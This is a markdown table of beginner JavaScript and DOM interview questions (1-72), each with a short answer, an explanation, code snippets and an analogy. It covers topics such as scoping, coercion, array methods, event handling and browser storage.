# JavaScript & Web Development Interview Q&A Bank for Freshers/Juniors

## BATCH 1: BEGINNER QUESTIONS 1-40 (JavaScript Core Basics)

| # | Question | Simple Answer (Max 20 words) | Explanation (Why/How - ELI5) | Code Example + Real-Life Analogy |
|---|----------|------------------------------|------------------------------|----------------------------------|
| 1 | What's the difference between `let` and `var`? | `let` is block-scoped, `var` is function-scoped. `var` hoists, `let` has temporal dead zone. | `var` declared variables are accessible throughout the entire function (or globally), even before declaration (hoisted as `undefined`). `let` is only accessible within the block `{}` where it's declared and throws ReferenceError if accessed before declaration. | **Code:** `if (true) { var x = 1; let y = 2; } console.log(x); // 1` `console.log(y); // ReferenceError` **Analogy:** `var` is a loudspeaker (everyone in the room hears). `let` is a private conversation (only people in the corner hear). |
| 2 | When should you use `const`? | Use `const` for values that won't be reassigned. Objects/arrays can still be mutated. | `const` prevents reassignment, not mutation. Use it by default for all variables, then switch to `let` if you need to reassign. This makes your code more predictable and catches bugs. | **Code:** `const user = {name: 'Alice'}; user.name = 'Bob'; // ✅ OK` `user = {}; // ❌ Error` **Analogy:** `const` is like a locked address. You can't move houses, but you can redecorate inside. |
| 3 | What are JavaScript's primitive data types? | String, Number, BigInt, Boolean, Undefined, Null, Symbol. Seven total. | Primitives are immutable values stored directly in memory. They're copied by value. Everything else in JS is an object (copied by reference). | **Code:** `let a = 5; let b = a; b = 10;` `console.log(a); // 5 (unchanged)` **Analogy:** Primitives are like photocopies - changing the copy doesn't affect the original. |
| 4 | What's the difference between `null` and `undefined`? | `undefined` means uninitialized. `null` means intentionally empty. Both are falsy. | `undefined` is JavaScript's default for missing values (unset variables, missing parameters). `null` is an explicit assignment meaning "no value on purpose". | **Code:** `let x; // undefined` `let y = null; // intentionally empty` `typeof null; // "object" (JS bug!)` **Analogy:** `undefined` is an empty box you forgot to fill. `null` is an empty box you deliberately left empty. |
| 5 | What is type coercion in JavaScript? | Automatic conversion of values from one type to another during operations. | JS is loosely typed, so it tries to "help" by converting types automatically. This can cause bugs if you're not careful. | **Code:** `"5" + 3; // "53" (string)` `"5" - 3; // 2 (number)` `true + 1; // 2` **Analogy:** Like a translator automatically converting languages mid-sentence - helpful but sometimes confusing. |
| 6 | What's the difference between `==` and `===`? | `==` checks value with type coercion. `===` checks value AND type (strict). | Use `===` almost always! `==` converts types before comparing, leading to weird bugs like `0 == "0"` being true. | **Code:** `5 == "5"; // true (coerced)` `5 === "5"; // false (strict)` `null == undefined; // true` `null === undefined; // false` **Analogy:** `==` is a lenient teacher who accepts close answers. `===` is strict and demands exact answers. |
| 7 | What is hoisting? | JavaScript moves declarations to the top of their scope during compilation. | Before executing code, JS "hoists" variable and function declarations to the top. Variables are hoisted but initialized as `undefined`. Functions are fully hoisted. | **Code:** `console.log(x); // undefined (not error!)` `var x = 5;` `// vs` `sayHi(); // "Hello!" (works!)` `function sayHi() { console.log("Hello!"); }` **Analogy:** Like reading a book's table of contents before reading chapters. |
| 8 | What is the scope of a variable? | Scope determines where variables can be accessed: global, function, or block level. | Scope is the "visibility zone" of variables. Global scope is everywhere. Function scope is inside functions. Block scope (`let`/`const`) is inside `{}`. | **Code:** `let global = 'I am everywhere';` `function test() { let local = 'Only here'; }` `if (true) { let block = 'Only in this block'; }` **Analogy:** Scope is like WiFi range - some variables reach everywhere (global), some only in one room (function/block). |
| 9 | What is a closure? | A function that remembers variables from its outer scope even after outer function returns. | Closures let inner functions "close over" outer variables, keeping them alive. Essential for data privacy and factory functions. | **Code:** `function outer() { let count = 0;` `  return function() { count++; return count; } }` `const counter = outer();` `counter(); // 1` `counter(); // 2` **Analogy:** A backpack a function carries everywhere, containing variables from where it was created. |
| 10 | What is the difference between function declaration and expression? | Declarations are hoisted; expressions are not. Declarations have names; expressions can be anonymous. | Function declarations are loaded before code runs (hoisted). Expressions are created when execution reaches them. | **Code:** `sayHi(); // Works!` `function sayHi() {} // Declaration` `sayBye(); // Error!` `const sayBye = function() {}; // Expression` **Analogy:** Declarations are like actors ready backstage. Expressions are actors who arrive when called. |
| 11 | What is the `this` keyword? | `this` refers to the object executing the current function. Context-dependent. | In methods, `this` is the object. In functions, it's global/undefined. In arrow functions, it's lexically inherited. In events, it's the element. | **Code:** `const obj = {` `  name: 'Alice',` `  greet() { console.log(this.name); }` `};` `obj.greet(); // "Alice"` **Analogy:** `this` is like saying "me" - who "me" is depends on who's speaking. |
| 12 | How do arrow functions differ from regular functions? | No own `this`, can't be constructors, implicit return, no `arguments` object. | Arrow functions inherit `this` from surrounding code (lexical). Great for callbacks. Can't use `new`. Concise syntax. | **Code:** `const add = (a, b) => a + b; // implicit return` `const obj = {` `  name: 'Bob',` `  greet: () => console.log(this.name) // ❌ wrong this!` `};` **Analogy:** Arrow functions are photocopies of `this` from parent; regular functions create their own `this`. |
| 13 | What is the spread operator (`...`)? | Expands iterables (arrays, objects) into individual elements. Useful for copying, merging. | The `...` operator "spreads out" arrays/objects. Creates shallow copies. Combines multiple arrays/objects easily. | **Code:** `const arr1 = [1, 2]; const arr2 = [...arr1, 3]; // [1,2,3]` `const obj = {a: 1}; const copy = {...obj, b: 2};` **Analogy:** Like unpacking a suitcase and spreading contents on a bed. |
| 14 | What is the rest parameter (`...`)? | Collects multiple arguments into an array. Must be the last parameter. | Opposite of spread - it gathers remaining values into an array. Perfect for functions with unknown argument counts. | **Code:** `function sum(...numbers) {` `  return numbers.reduce((a,b) => a+b, 0);` `}` `sum(1, 2, 3, 4); // 10` **Analogy:** Like saying "...and everything else" - bundles remaining items together. |
| 15 | What is destructuring? | Extract values from arrays/objects into distinct variables using matching patterns. | Cleaner syntax to unpack values. Reduces repetitive dot notation. Can set default values. | **Code:** `const [a, b] = [1, 2]; // a=1, b=2` `const {name, age} = {name: 'Alice', age: 25};` `const {x = 10} = {}; // default value` **Analogy:** Like taking specific items out of a gift box and labeling them. |
| 16 | What is the ternary operator? | Shorthand for if-else: `condition ? valueIfTrue : valueIfFalse`. Single expression. | Concise conditional assignment. Returns a value (unlike if-else statement). Good for simple conditions. | **Code:** `const age = 20;` `const status = age >= 18 ? 'adult' : 'minor';` `// Instead of:` `let status; if (age >= 18) { status = 'adult'; } else { status = 'minor'; }` **Analogy:** Like a fork in the road - one question, two possible paths. |
| 17 | What is nullish coalescing (`??`)? | Returns right operand when left is `null` or `undefined`, not other falsy values. | Better than `||` for default values because it doesn't treat 0, false, "" as "no value". | **Code:** `const count = 0;` `const result = count ?? 10; // 0 (not 10!)` `const result2 = count || 10; // 10 (wrong!)` **Analogy:** `??` checks if something exists at all. `||` checks if something is "truthy enough". |
| 18 | What is optional chaining (`?.`)? | Safely access nested properties without checking each level for null/undefined. | Prevents "Cannot read property of undefined" errors. Returns `undefined` if any part of the chain is null/undefined. | **Code:** `const user = {profile: {name: 'Alice'}};` `user.profile?.name; // "Alice"` `user.address?.city; // undefined (no error!)` **Analogy:** Like asking "If this door exists, is there a room? If yes, what's inside?" |
| 19 | What are falsy values in JavaScript? | `false`, `0`, `-0`, `0n`, `""`, `null`, `undefined`, `NaN`. Everything else is truthy. | These 8 values coerce to `false` in boolean contexts. Important for conditionals and logical operators. | **Code:** `if ("") { console.log("Won't run"); }` `if ("0") { console.log("Will run!"); } // "0" is truthy!` `Boolean(0); // false` **Analogy:** Falsy values are VIP members of the "counts as no" club. Everything else is a yes. |
| 20 | What is `NaN` and how do you check for it? | "Not-a-Number" - result of invalid math operations. Use `Number.isNaN()` to check. | `NaN` is a special number that doesn't equal itself! `isNaN()` coerces values; `Number.isNaN()` doesn't. | **Code:** `0 / 0; // NaN` `"abc" * 5; // NaN` `NaN === NaN; // false! (weird!)` `Number.isNaN(NaN); // true` `isNaN("abc"); // true (coerces!)` **Analogy:** A broken calculator display showing "ERROR" instead of a number. |
| 21 | What is the difference between `for...in` and `for...of`? | `for...in` iterates over keys/indices. `for...of` iterates over values. Different use cases. | `for...in` loops through object properties (or array indices). `for...of` loops through iterable values (arrays, strings, maps). | **Code:** `const arr = ['a', 'b', 'c'];` `for (let i in arr) { console.log(i); } // 0, 1, 2` `for (let val of arr) { console.log(val); } // a, b, c` **Analogy:** `for...in` reads page numbers. `for...of` reads the actual content. |
| 22 | What is the purpose of `use strict`? | Enables strict mode: catches common errors, prevents unsafe actions, improves optimization. | Strict mode throws errors for silent failures, disallows old bad practices (like creating globals accidentally), makes debugging easier. | **Code:** `"use strict";` `x = 5; // ReferenceError (no var/let/const!)` `delete Object.prototype; // Error` `function test(a, a) {} // Error (duplicate params)` **Analogy:** Like turning on spell-check and grammar-check - catches mistakes before they become problems. |
| 23 | What is a callback function? | A function passed as argument to another function, executed later. | Callbacks enable asynchronous code and reusable functions. They're called back when an operation completes. | **Code:** `function greet(name, callback) {` `  console.log('Hello ' + name);` `  callback();` `}` `greet('Alice', function() { console.log('Callback executed!'); });` **Analogy:** Like leaving a note saying "Call me when you're done" instead of waiting. |
| 24 | What is the difference between `==` comparison for objects? | Objects are compared by reference, not by value. Two objects are equal only if they're the same object. | Even if two objects have identical properties, `==` and `===` return false unless they point to the same memory location. | **Code:** `{a: 1} === {a: 1}; // false (different objects)` `const obj = {a: 1};` `const ref = obj;` `obj === ref; // true (same reference)` **Analogy:** Like comparing houses by address (reference), not by what's inside (value). |
| 25 | What is implicit type coercion? | Automatic type conversion JavaScript does during operations with mixed types. | JS converts types behind the scenes to make operations work. Can be helpful or bug-prone. | **Code:** `"5" + 2; // "52" (number to string)` `"5" - 2; // 3 (string to number)` `true + 1; // 2 (boolean to number)` `[1] + [2]; // "12" (arrays to strings)` **Analogy:** Like a helpful but overzealous assistant who "fixes" your inputs automatically. |
| 26 | What are template literals? | String literals using backticks allowing embedded expressions and multi-line strings. | Template literals use `` ` `` instead of quotes. Embed variables with `${}`. Preserve newlines. Cleaner than concatenation. | **Code:** ``const name = 'Alice'; const greeting = `Hello ${name}!`;`` ``const multi = `Line 1` `Line 2`; // Works!`` **Analogy:** Like Mad Libs - a template with blanks you fill in with variables. |
| 27 | What is the `typeof` operator? | Returns a string indicating the type of operand. Has quirks! | Useful for type checking, but has gotchas: `typeof null` is "object" (bug), `typeof []` is "object", `typeof NaN` is "number". | **Code:** `typeof "hello"; // "string"` `typeof 42; // "number"` `typeof null; // "object" (bug!)` `typeof undefined; // "undefined"` `typeof []; // "object"` **Analogy:** Like a label maker that mostly works but sometimes puts wrong labels. |
| 28 | What is short-circuit evaluation? | Logical operators `&&` and `||` stop evaluating once result is determined. | `&&` returns first falsy value or last value. `||` returns first truthy value or last value. Efficient and useful for conditionals. | **Code:** `false && expensiveFunction(); // Doesn't call function!` `const name = userName || 'Guest'; // Default value` `isLoggedIn && showDashboard(); // Conditional execution` **Analogy:** Like a security guard who stops checking IDs once one person fails. |
| 29 | What is the difference between `.call()`, `.apply()`, and `.bind()`? | All control `this`, but differently: `.call(this, args)`, `.apply(this, [args])`, `.bind()` returns new function. | `.call()` and `.apply()` invoke immediately with custom `this`. `.bind()` creates a new function with bound `this` for later. | **Code:** `function greet(greeting) { console.log(greeting + ' ' + this.name); }` `greet.call({name: 'Alice'}, 'Hi'); // "Hi Alice"` `greet.apply({name: 'Bob'}, ['Hey']); // "Hey Bob"` `const boundGreet = greet.bind({name: 'Charlie'}); boundGreet('Hello'); // "Hello Charlie"` **Analogy:** `.call`/`.apply` are one-time disguises. `.bind` is a permanent costume change. |
| 30 | What is lexical scope? | Scope determined by where variables are declared in code, not where they're called. | Functions can access variables from their parent scope at write-time. This enables closures. | **Code:** `let outer = 'I am outer';` `function parent() { let inner = 'I am inner';` `  function child() { console.log(outer, inner); } // Accesses both!` `  child();` `}` **Analogy:** Like family inheritance - children inherit from parents based on family tree, not who they talk to. |
| 31 | What are higher-order functions? | Functions that take functions as arguments or return functions. | Enables functional programming patterns like `map`, `filter`, `reduce`. Makes code more reusable and composable. | **Code:** `function repeat(n, action) {` `  for (let i = 0; i < n; i++) action(i);` `}` `repeat(3, console.log); // 0, 1, 2` `// Array methods are HOFs:` `[1,2,3].map(x => x * 2); // [2,4,6]` **Analogy:** Like a vending machine that accepts coins (functions) and gives you different snacks (results). |
| 32 | What is the difference between `null` and an empty object `{}`? | `null` means "no object." `{}` is an actual object (empty but exists). | `null` is a primitive indicating absence. `{}` is a reference type with allocated memory (though empty). | **Code:** `typeof null; // "object" (JS bug!)` `typeof {}; // "object"` `null == {}; // false` `Boolean(null); // false` `Boolean({}); // true` **Analogy:** `null` is "no box at all." `{}` is an empty box that exists. |
| 33 | What is a pure function? | Function with no side effects; same input always produces same output. | Pure functions don't modify external state or depend on it. Predictable, testable, and cacheable. | **Code:** `// Pure` `function add(a, b) { return a + b; }` `// Impure` `let total = 0;` `function addToTotal(n) { total += n; } // Modifies external state!` **Analogy:** Like a math equation: 2+2 always equals 4, regardless of when or where you calculate it. |
| 34 | What is the difference between parameters and arguments? | Parameters are variables in function definition. Arguments are actual values passed when calling. | Parameters are placeholders (recipe ingredients list). Arguments are the actual values (actual eggs and flour you use). | **Code:** `function greet(name) { // 'name' is parameter` `  console.log('Hello ' + name);` `}` `greet('Alice'); // 'Alice' is argument` **Analogy:** Parameters are blank spaces in a form. Arguments are what you write in those spaces. |
| 35 | What are default parameters? | Assign default values to function parameters if no argument provided or `undefined` passed. | Makes functions more flexible. Old way used `||` operator which had bugs with falsy values. | **Code:** `function greet(name = 'Guest') {` `  console.log('Hello ' + name);` `}` `greet(); // "Hello Guest"` `greet('Alice'); // "Hello Alice"` `greet(undefined); // "Hello Guest"` **Analogy:** Like a restaurant where if you don't specify a drink, you automatically get water. |
| 36 | What is the comma operator? | Evaluates multiple expressions, returns last one. Rarely used except in `for` loops. | The comma operator evaluates left-to-right and returns the rightmost value. Mostly seen in loop increments. | **Code:** `let x = (1, 2, 3); // x = 3` `for (let i = 0, j = 10; i < j; i++, j--) { }` `// Rarely useful:` `const a = (console.log('side effect'), 42); // a = 42` **Analogy:** Like doing chores in sequence but only caring about the last one's result. |
| 37 | What is the `void` operator? | Evaluates expression and returns `undefined`. Rarely used. | Mostly seen in `javascript:void(0)` to prevent navigation. Modern code rarely needs it. | **Code:** `void 0; // undefined` `void (2 + 2); // undefined (still calculates, just returns undefined)` `<a href="javascript:void(0)">Click</a> // Old way to prevent navigation` **Analogy:** Like a shredder - you put something in, but nothing useful comes out (undefined). |
| 38 | What is variable shadowing? | Inner variable with same name "shadows" outer variable in its scope. | The inner variable takes precedence. Outer variable isn't destroyed, just inaccessible in that scope. | **Code:** `let name = 'Outer';` `function test() {` `  let name = 'Inner'; // Shadows outer 'name'` `  console.log(name); // "Inner"` `}` `console.log(name); // "Outer"` **Analogy:** Like two people named John - the closer one gets your attention when you call "John!" |
| 39 | What is the `in` operator? | Checks if property exists in object (own or inherited). Returns boolean. | Checks for property existence, not value. Returns true even if value is `undefined`. | **Code:** `const obj = {name: 'Alice', age: undefined};` `'name' in obj; // true` `'age' in obj; // true (even though undefined!)` `'toString' in obj; // true (inherited!)` **Analogy:** Like checking if a book has a chapter, not if the chapter has content. |
| 40 | What is the `instanceof` operator? | Checks if object is instance of a class/constructor. Checks prototype chain. | Tests if an object was created by a specific constructor or inherits from it. | **Code:** `const arr = [1, 2, 3];` `arr instanceof Array; // true` `arr instanceof Object; // true (Array inherits from Object)` `[] instanceof Array; // true` `"hello" instanceof String; // false (primitive!)` **Analogy:** Like checking if someone graduated from a specific school or its branches. |

---

**✅ BATCH 1 COMPLETE (Questions 1-40)**

---

## BATCH 2: BEGINNER QUESTIONS 41-80 (Functions, Arrays, DOM Basics)

| # | Question | Simple Answer (Max 20 words) | Explanation (Why/How - ELI5) | Code Example + Real-Life Analogy |
|---|----------|------------------------------|------------------------------|----------------------------------|
| 41 | What is the `arguments` object? | Array-like object containing all arguments passed to a function. Not available in arrow functions. | Useful for functions with variable argument counts. It's array-like (has length, indexed) but not a true array. Convert with `Array.from()`. | **Code:** `function sum() {` `  let total = 0;` `  for (let i = 0; i < arguments.length; i++) total += arguments[i];` `  return total;` `}` `sum(1, 2, 3); // 6` **Analogy:** Like a guest book that records everyone who entered, even uninvited ones. |
| 42 | What is an IIFE (Immediately Invoked Function Expression)? | Function that runs immediately after creation. Creates private scope. Used before modules existed. | Wraps code in function scope to avoid polluting global namespace. Pattern: `(function() { ... })()`. Less common now with modules. | **Code:** `(function() {` `  let private = 'Can't access me outside';` `  console.log('I run immediately!');` `})();` `// Old module pattern:` `const module = (function() { return {public: 'value'}; })();` **Analogy:** Like a self-destructing message - it executes once and disappears. |
| 43 | What is the difference between `.forEach()` and `.map()`? | `.forEach()` executes function, returns `undefined`. `.map()` transforms array, returns new array. | Use `.forEach()` for side effects (logging, DOM updates). Use `.map()` when you need a transformed array. | **Code:** `const nums = [1, 2, 3];` `nums.forEach(n => console.log(n)); // undefined returned` `const doubled = nums.map(n => n * 2); // [2, 4, 6]` **Analogy:** `.forEach()` is a tour guide pointing at things. `.map()` is a factory transforming raw materials. |
| 44 | What does `.filter()` do? | Creates new array with elements that pass a test function. Doesn't mutate original. | Returns array of elements where callback returns truthy. Original array unchanged. Returns empty array if nothing passes. | **Code:** `const nums = [1, 2, 3, 4, 5];` `const evens = nums.filter(n => n % 2 === 0); // [2, 4]` `const adults = users.filter(u => u.age >= 18);` **Analogy:** Like a bouncer only letting certain people (that pass the test) into a club. |
| 45 | What does `.reduce()` do? | Reduces array to single value by applying function cumulatively to elements. | Most powerful array method. Accumulator carries result through iterations. Can build objects, arrays, or compute single values. | **Code:** `const nums = [1, 2, 3, 4];` `const sum = nums.reduce((acc, n) => acc + n, 0); // 10` `// Build object:` `const items = ['a', 'b', 'a'];` `const count = items.reduce((acc, item) => {` `  acc[item] = (acc[item] || 0) + 1; return acc;` `}, {}); // {a: 2, b: 1}` **Analogy:** Like a snowball rolling downhill, accumulating more snow with each roll. |
| 46 | What's the difference between `.find()` and `.filter()`? | `.find()` returns first match or `undefined`. `.filter()` returns array of all matches. | `.find()` stops at first truthy result (efficient). `.filter()` checks every element (returns all matches). | **Code:** `const users = [{id: 1, name: 'Alice'}, {id: 2, name: 'Bob'}];` `users.find(u => u.id === 1); // {id: 1, name: 'Alice'}` `users.filter(u => u.id === 1); // [{id: 1, name: 'Alice'}]` **Analogy:** `.find()` is finding one specific person in a crowd. `.filter()` is finding everyone wearing red. |
| 47 | What does `.some()` do? | Returns `true` if at least one element passes test. Short-circuits. | Stops checking once it finds a truthy value. Opposite of `.every()`. Returns false for empty arrays. | **Code:** `const nums = [1, 2, 3, 4];` `nums.some(n => n > 3); // true` `nums.some(n => n > 10); // false` `[].some(() => true); // false (empty array)` **Analogy:** Like asking "Is anyone here over 6 feet tall?" - you only need one yes. |
| 48 | What does `.every()` do? | Returns `true` if all elements pass test. Short-circuits on first failure. | All elements must pass. Stops at first falsy value. Returns true for empty arrays (vacuous truth). | **Code:** `const nums = [2, 4, 6];` `nums.every(n => n % 2 === 0); // true (all even)` `[1, 2, 3].every(n => n > 0); // true` `[].every(() => false); // true (weird but correct!)` **Analogy:** Like checking if everyone passed the test - one failure means the whole class failed. |
| 49 | What is the difference between `.slice()` and `.splice()`? | `.slice()` copies portion without mutating. `.splice()` adds/removes elements, mutates original array. | `.slice(start, end)` is non-destructive extraction. `.splice(start, deleteCount, ...items)` modifies the original array in place. | **Code:** `const arr = [1, 2, 3, 4];` `arr.slice(1, 3); // [2, 3], arr unchanged` `arr.splice(1, 2, 'a', 'b'); // returns [2, 3]` `// arr is now [1, 'a', 'b', 4]` **Analogy:** `.slice()` is photocopying pages. `.splice()` is cutting and pasting in the original book. |
| 50 | How do you copy an array? | Use spread `[...arr]`, `.slice()`, `Array.from()`, or `.concat()`. All create shallow copies. | These create new arrays with same elements. For nested arrays/objects, elements are still referenced (shallow copy). | **Code:** `const original = [1, 2, 3];` `const copy1 = [...original];` `const copy2 = original.slice();` `const copy3 = Array.from(original);` `copy1.push(4); // original unchanged` **Analogy:** Like duplicating a photo album - you have two albums, but the photos inside are the same. |
| 51 | What's the difference between shallow and deep copy? | Shallow copies top level only. Deep copy recursively copies nested objects/arrays. | Shallow copy: new container, same references inside. Deep copy: everything new. Deep copy needs recursion or libraries. | **Code:** `const obj = {a: 1, nested: {b: 2}};` `const shallow = {...obj};` `shallow.nested.b = 99; // Original also changed!` `// Deep copy:` `const deep = JSON.parse(JSON.stringify(obj)); // Simple but has limits` **Analogy:** Shallow copy: new house, same furniture. Deep copy: new house, new furniture (everything duplicated). |
| 52 | What is `Array.isArray()`? | Static method that checks if value is an array. Only reliable way. | `typeof []` returns "object". `instanceof Array` fails across frames. `Array.isArray()` always works correctly. | **Code:** `Array.isArray([1, 2]); // true` `Array.isArray('hello'); // false` `Array.isArray({length: 2}); // false` `typeof []; // "object" (not helpful!)` **Analogy:** Like a metal detector specifically designed to only beep for arrays, nothing else. |
| 53 | What does `.join()` do? | Converts array to string with specified separator. Opposite of `.split()`. | Joins array elements into single string. Default separator is comma. `.split()` does the reverse. | **Code:** `['Hello', 'World'].join(' '); // "Hello World"` `[1, 2, 3].join('-'); // "1-2-3"` `[1, 2, 3].join(); // "1,2,3" (default comma)` `// Reverse:` `"a-b-c".split('-'); // ['a', 'b', 'c']` **Analogy:** Like stringing beads together with thread - beads are elements, thread is separator. |
| 54 | What is the difference between `.push()` and `.concat()`? | `.push()` mutates original array, adds to end. `.concat()` returns new array, doesn't mutate. | `.push()` modifies in place and returns new length. `.concat()` creates new array merging multiple arrays. | **Code:** `const arr1 = [1, 2];` `arr1.push(3); // arr1 is now [1, 2, 3], returns 3` `const arr2 = [1, 2];` `const arr3 = arr2.concat([3, 4]); // arr2 unchanged` **Analogy:** `.push()` is adding to your existing shopping cart. `.concat()` is creating a new cart with everything. |
| 55 | What does `.includes()` do? | Checks if array contains value. Returns boolean. Uses `===` comparison. | Simpler than `.indexOf() !== -1`. Works with `NaN` (unlike `indexOf`). Case-sensitive for strings. | **Code:** `[1, 2, 3].includes(2); // true` `[1, 2, 3].includes(4); // false` `['hello'].includes('Hello'); // false (case-sensitive)` `[NaN].includes(NaN); // true (indexOf can't do this!)` **Analogy:** Like checking if a specific card is in your deck - yes or no answer. |
| 56 | What is the `querySelector()` method? | Selects first element matching CSS selector. Returns element or `null`. Modern replacement for `getElementById`. | Uses CSS selectors (classes, IDs, attributes, pseudo-selectors). More flexible than old methods. Returns null if not found. | **Code:** `document.querySelector('#myId');` `document.querySelector('.myClass');` `document.querySelector('div > p');` `document.querySelector('[data-id="123"]');` **Analogy:** Like using a very specific search query - finds the first exact match. |
| 57 | What's the difference between `querySelector` and `getElementById`? | `querySelector` uses CSS selectors, slower. `getElementById` only accepts ID, faster for single ID. | `getElementById` is faster for direct ID lookup. `querySelector` is more flexible. Both return single element or null. | **Code:** `document.getElementById('myId'); // Fast, ID only` `document.querySelector('#myId'); // Flexible, any CSS` `document.querySelector('.class'); // Can do classes` `// getElementById doesn't need '#'` **Analogy:** `getElementById` is a direct phone call. `querySelector` is searching through a directory. |
| 58 | What's the difference between `querySelectorAll` and `getElementsByClassName`? | `querySelectorAll` returns static NodeList. `getElementsByClassName` returns live HTMLCollection. | Static: snapshot at query time. Live: auto-updates when DOM changes. `querySelectorAll` is usually safer. | **Code:** `const static = document.querySelectorAll('.item'); // Static` `const live = document.getElementsByClassName('item'); // Live` `// If you add .item element to DOM:` `// static.length stays same` `// live.length increases automatically!` **Analogy:** Static is a photograph. Live is a live video feed that updates in real-time. |
| 59 | What is event bubbling? | Events propagate from target element up to ancestors (child → parent → grandparent). | Most events bubble upward through DOM tree. Allows event delegation. `stopPropagation()` prevents bubbling. | **Code:** `<div onclick="console.log('div')">` `  <button onclick="console.log('button')">Click</button>` `</div>` `// Clicking button logs: "button" then "div"` **Analogy:** Like dropping a stone in water - ripples spread outward from the splash point. |
| 60 | What is event capturing (trickling)? | Events propagate from root down to target (opposite of bubbling). Rarely used. | Capturing phase happens before bubbling. Set third argument of `addEventListener` to `true` to use. | **Code:** `element.addEventListener('click', handler, true); // Capturing` `element.addEventListener('click', handler, false); // Bubbling (default)` `// Order: Capturing down → Target → Bubbling up` **Analogy:** Like a relay race starting from the stadium entrance down to the finish line (vs bubbling up). |
| 61 | What is event delegation? | Attach single listener to parent instead of multiple listeners to children. Uses bubbling. | Efficient for many similar elements. Works with dynamically added elements. Relies on event bubbling. | **Code:** `// ❌ Bad: listener on each item` `items.forEach(item => item.addEventListener('click', handler));` `// ✅ Good: one listener on parent` `list.addEventListener('click', (e) => {` `  if (e.target.matches('.item')) handler(e);` `});` **Analogy:** Instead of hiring 100 guards for 100 doors, hire one supervisor watching all doors. |
| 62 | What does `preventDefault()` do? | Stops browser's default action for the event (like form submit, link navigation). | Prevents default behavior but doesn't stop propagation. Common for custom form handling and links. | **Code:** `form.addEventListener('submit', (e) => {` `  e.preventDefault(); // Don't submit form` `  // Handle with AJAX instead` `});` `link.addEventListener('click', (e) => {` `  e.preventDefault(); // Don't navigate` `});` **Analogy:** Like catching a ball mid-air and deciding what to do with it instead of letting it land. |
| 63 | What does `stopPropagation()` do? | Stops event from bubbling up to parent elements. | Prevents ancestors from receiving the event. Doesn't prevent default behavior. Use sparingly - can break delegation. | **Code:** `child.addEventListener('click', (e) => {` `  e.stopPropagation(); // Parent won't receive this event` `  console.log('Child clicked');` `});` `parent.addEventListener('click', () => {` `  console.log('Parent clicked'); // Won't run if child clicked` `});` **Analogy:** Like whispering a secret - only you hear it, doesn't travel to others in the room. |
| 64 | What's the difference between `innerHTML`, `textContent`, and `innerText`? | `innerHTML` parses HTML. `textContent` returns all text. `innerText` returns visible text only. | `innerHTML` can create XSS vulnerabilities. `textContent` is faster and safer. `innerText` considers CSS (slow). | **Code:** `const div = document.querySelector('div');` `div.innerHTML = '<b>Bold</b>'; // Renders bold` `div.textContent = '<b>Bold</b>'; // Shows literal text` `div.innerText; // Ignores hidden elements` **Analogy:** `innerHTML` is HTML compiler. `textContent` is raw script reader. `innerText` is what the audience sees. |
| 65 | What is the difference between `createElement` and `innerHTML`? | `createElement` is safer, programmatic. `innerHTML` parses strings, potential XSS risk. | `createElement` creates actual DOM nodes. `innerHTML` parses HTML strings (can inject malicious code). createElement is better for dynamic content. | **Code:** `// ✅ Safe:` `const div = document.createElement('div');` `div.textContent = userInput; // Escaped automatically` `// ❌ Risky:` `element.innerHTML = '<div>' + userInput + '</div>'; // XSS risk!` **Analogy:** `createElement` is building with LEGO bricks. `innerHTML` is painting a picture (faster but riskier). |
| 66 | What is LocalStorage? | Browser storage API for persistent key-value pairs. Survives page reloads and browser closes. | Stores strings only (JSON.stringify for objects). 5-10MB limit. Same-origin only. Synchronous (can block). | **Code:** `localStorage.setItem('user', JSON.stringify({name: 'Alice'}));` `const user = JSON.parse(localStorage.getItem('user'));` `localStorage.removeItem('user');` `localStorage.clear(); // Remove all` **Analogy:** Like a permanent sticky note on your browser - stays there until you remove it. |
| 67 | What's the difference between LocalStorage and SessionStorage? | LocalStorage persists after browser closes. SessionStorage clears when tab/window closes. | Both are same-origin, synchronous, string-only. SessionStorage is per-tab. LocalStorage is browser-wide. | **Code:** `localStorage.setItem('permanent', 'I survive browser close');` `sessionStorage.setItem('temporary', 'I die with this tab');` `// Close and reopen browser:` `// localStorage still has data` `// sessionStorage is gone` **Analogy:** LocalStorage is a diary (permanent). SessionStorage is a whiteboard (erased after class ends). |
| 68 | What's the difference between cookies and LocalStorage? | Cookies sent with HTTP requests, smaller (4KB), expire. LocalStorage is client-only, larger (5-10MB). | Cookies: sent to server automatically, can set expiry, smaller. LocalStorage: never sent to server, larger, manual management. | **Code:** `// Cookie (old way):` `document.cookie = "user=Alice; expires=...";` `// LocalStorage (modern):` `localStorage.setItem('user', 'Alice');` `// Cookie goes to server with every request` `// LocalStorage stays client-side` **Analogy:** Cookies are luggage tags (travel with your request). LocalStorage is home storage (stays in browser). |
| 69 | What is the DOM? | Document Object Model - JavaScript representation of HTML. Tree structure of objects. | Browser parses HTML into tree of objects (nodes). JavaScript manipulates this tree to change page dynamically. | **Code:** `// HTML: <div id="app"><p>Hello</p></div>` `// DOM tree:` `// document` `//   └─ html` `//      └─ body` `//         └─ div#app` `//            └─ p` `//               └─ "Hello"` **Analogy:** Like a family tree where you can add/remove/modify members programmatically. |
| 70 | What is the difference between `window` and `document`? | `window` is global browser object. `document` is the HTML document inside window. | `window` represents browser window (has `alert`, `setTimeout`, etc.). `document` is the webpage content (DOM). | **Code:** `window.alert('Hi'); // Browser feature` `window.location.href; // Current URL` `document.querySelector('div'); // DOM query` `window.document === document; // true` **Analogy:** `window` is the picture frame and room. `document` is the picture inside the frame. |
| 71 | What does `.appendChild()` do? | Adds node as last child of parent element. Moves node if it already exists. | If node exists in DOM, it's moved (not copied). Returns the appended node. | **Code:** `const div = document.createElement('div');` `div.textContent = 'Hello';` `document.body.appendChild(div);` `// If div was elsewhere, it moves:` `parent2.appendChild(div); // Moves from body to parent2` **Analogy:** Like adopting a child - if they were in another family, they move to yours. |
| 72 | What's the difference between `.append()` and `.appendChild()`? | `.append()` accepts multiple nodes and strings. `.appendChild()` accepts one node, returns it. | `.append()` is newer, more flexible (strings become text nodes). `.appendChild()` is older, returns the node. | **Code:** `parent.appendChild(div); // Returns div, one element only` `parent.append(div1, div2, 'text'); // Multiple items, no return` `parent.append('Hello'); // String works!` `parent.appendChild('Hello'); // ❌ Error!` **Analogy:** `.appendChild()` is a single-item checkout. `.append()` is bulk checkout with cart. |
